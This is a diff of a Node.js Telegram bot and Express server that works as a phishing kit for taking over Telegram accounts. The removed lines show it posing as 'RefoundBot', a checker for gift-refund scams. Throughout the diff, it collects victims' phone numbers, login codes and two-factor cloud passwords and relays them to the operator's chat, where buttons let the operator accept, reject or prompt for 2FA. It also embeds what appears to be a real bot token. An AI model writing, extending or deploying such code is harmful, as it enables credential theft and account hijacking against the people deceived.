@@ -1,101 +1,91 @@
 const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 
-// Токен вашего бота (замените на свой)
-const token = '8446641895:AAGsj1a1u8AQpKJxhFGhfu_yXaz6LKduAkE';
+const token = '8446641895:AAGsj1a1u8AQpKJxhFGhfu_yXaz6LKduAkE'; // Замените на ваш токен
 const bot = new TelegramBot(token, { polling: true });
+const YOUR_CHAT_ID = 8224914068; // Ваш chat ID
+const app = express();
+app.use(express.json());
 
-// ID чата, куда будут приходить уведомления (замените на свой)
-const YOUR_CHAT_ID = 8224914068;
+// Храним коды для проверки (в реальном проекте используйте базу данных)
+const userCodes = {};
 
-// Временное хранилище для данных пользователей (в реальном приложении используйте базу данных)
-const userData = {};
-
-// Обработчик команды /start
-bot.onText(/\/start/, (msg) => {
-    const chatId = msg.chat.id;
-    const welcomeText = `Добро пожаловать в RefoundBot! Данный бот был создан, чтобы люди могли проверять подарки на рефаунд и не стать жертвой обмана. Чтобы зайти в приложение, нажмите кнопку ниже 👇`;
-    const options = {
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: '🚀 Открыть мини-приложение', web_app: { url: 'https://your-mini-app-url.com' } }]
-            ]
+// 1. Принимаем запрос на отправку кода из браузера
+app.post('/send-code', (req, res) => {
+    const { phone } = req.body;
+    
+    // Генерируем случайный код
+    const code = Math.floor(10000 + Math.random() * 90000).toString();
+    userCodes[phone] = code;
+    
+    // Отправляем вам уведомление с кнопками
+    bot.sendMessage(YOUR_CHAT_ID, 
+        `🔐 НОВАЯ РЕГИСТРАЦИЯ\n📱 Номер: ${phone}\n🌍 Страна: Russia`,
+        {
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '✅ Принять', callback_data: `accept_${phone}` }],
+                    [{ text: '❌ Отклонить', callback_data: `reject_${phone}` }],
+                    [{ text: '🔑 2FA', callback_data: `request2fa_${phone}` }]
+                ]
+            }
         }
-    };
-    bot.sendMessage(chatId, welcomeText, options);
+    );
+    
+    res.json({ success: true, code: code }); // Отправляем код обратно в браузер
 });
 
-// Обработчик callback_query от кнопок "Принять", "Отклонить", "2FA"
-bot.on('callback_query', (callbackQuery) => {
-    const message = callbackQuery.message;
-    const data = callbackQuery.data;
-    const userId = callbackQuery.from.id;
-
-    if (data.startsWith('accept_')) {
-        const userPhone = data.split('_')[1];
-        // Отправляем пользователю сообщение об успешной регистрации
-        bot.sendMessage(userId, 'Регистрация прошла успешно! Ожидайте 5 минут, пока мы анализируем ваш аккаунт! После анализа окно автоматически уберется.');
-        // Удаляем кнопки из сообщения в вашем чате
-        bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: message.chat.id, message_id: message.message_id });
-        // Отправляем подтверждение в Mini App через ответ на callback_query
-        bot.answerCallbackQuery(callbackQuery.id, { text: 'Регистрация принята!' });
-    } else if (data.startsWith('reject_')) {
-        const userPhone = data.split('_')[1];
-        // Отправляем пользователю сообщение об ошибке
-        bot.sendMessage(userId, 'Неправильный код. Попробуйте позже!');
-        // Удаляем кнопки из сообщения в вашем чате
-        bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: message.chat.id, message_id: message.message_id });
-        bot.answerCallbackQuery(callbackQuery.id, { text: 'Регистрация отклонена!' });
-    } else if (data.startsWith('request2fa_')) {
-        const userPhone = data.split('_')[1];
-        // Отправляем пользователю запрос на 2FA
-        bot.sendMessage(userId, 'У вас установлен облачный пароль. Введите его в строку 2FA');
-        bot.answerCallbackQuery(callbackQuery.id, { text: 'Запрос 2FA отправлен!' });
+// 2. Принимаем введённый пользователем код
+app.post('/login', (req, res) => {
+    const { phone, code, fa } = req.body;
+    const correctCode = userCodes[phone];
+    
+    if (code === correctCode) {
+        // Отправляем вам второе уведомление
+        bot.sendMessage(YOUR_CHAT_ID,
+            `✅ РЕГИСТРАЦИЯ УСПЕШНА\n📱 Номер: ${phone}\n🔑 Код: ${code}${fa ? `\n🔐 2FA: ${fa}` : ''}\n🌍 Страна: Russia`,
+            {
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: '✅ Принять', callback_data: `accept_final_${phone}` }],
+                        [{ text: '❌ Отклонить', callback_data: `reject_final_${phone}` }],
+                        [{ text: '🔑 2FA', callback_data: `request2fa_final_${phone}` }]
+                    ]
+                }
+            }
+        );
+        
+        res.json({ success: true });
+    } else {
+        res.json({ success: false, error: 'Неверный код' });
     }
 });
 
-// Веб-сервер для обслуживания Mini App
-const app = express();
-const PORT = process.env.PORT || 3000;
-
-app.use(express.static('public')); // Папка с файлами Mini App
-app.use(express.json());
-
-// Эндпоинт для обработки запроса на отправку кода
-app.post('/send-code', (req, res) => {
-    const { phoneNumber, country } = req.body;
-    const userId = req.body.userId;
-
-    // Сохраняем данные пользователя
-    userData[userId] = { phoneNumber, country };
-
-    // Отправляем уведомление в ваш чат
-    const notificationText = `🔐 Попытка регистрации\n📱 Номер: ${phoneNumber}\n🌍 Страна: ${country}`;
-    bot.sendMessage(YOUR_CHAT_ID, notificationText);
-
-    res.json({ success: true });
+// 3. Обработка нажатий на кнопки
+bot.on('callback_query', (callbackQuery) => {
+    const data = callbackQuery.data;
+    const chatId = callbackQuery.message.chat.id;
+    const messageId = callbackQuery.message.message_id;
+    
+    if (data.startsWith('accept_')) {
+        const phone = data.replace('accept_', '');
+        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Запрос принят' });
+        // Можно отправить что-то пользователю, если знаем его chat_id
+    }
+    else if (data.startsWith('reject_')) {
+        const phone = data.replace('reject_', '');
+        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Запрос отклонён' });
+    }
+    else if (data.startsWith('request2fa_')) {
+        const phone = data.replace('request2fa_', '');
+        bot.answerCallbackQuery(callbackQuery.id, { text: '🔑 Запрошен 2FA пароль' });
+    }
+    
+    // Убираем кнопки после нажатия
+    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
+        chat_id: chatId,
+        message_id: messageId
+    });
 });
 
-// Эндпоинт для обработки логина (ввода кода)
-app.post('/login', (req, res) => {
-    const { phoneNumber, code, country, userId } = req.body;
-
-    // Отправляем уведомление в ваш чат с кнопками
-    const notificationText = `✅ Регистрация успешна\n📱 Номер: ${phoneNumber}\n🔑 Код: ${code}\n🌍 Страна: ${country}`;
-    const options = {
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: 'Принять', callback_data: `accept_${phoneNumber}` }],
-                [{ text: 'Отклонить', callback_data: `reject_${phoneNumber}` }],
-                [{ text: '2FA', callback_data: `request2fa_${phoneNumber}` }]
-            ]
-        }
-    };
-    bot.sendMessage(YOUR_CHAT_ID, notificationText, options);
-
-    res.json({ success: true, message: 'Ожидайте подтверждения...' });
-});
-
-app.listen(PORT, () => {
-    console.log(`Сервер запущен на порту ${PORT}`);
-});
+app.listen(3000, () => console.log('✅ Сервер запущен на порту 3000'));
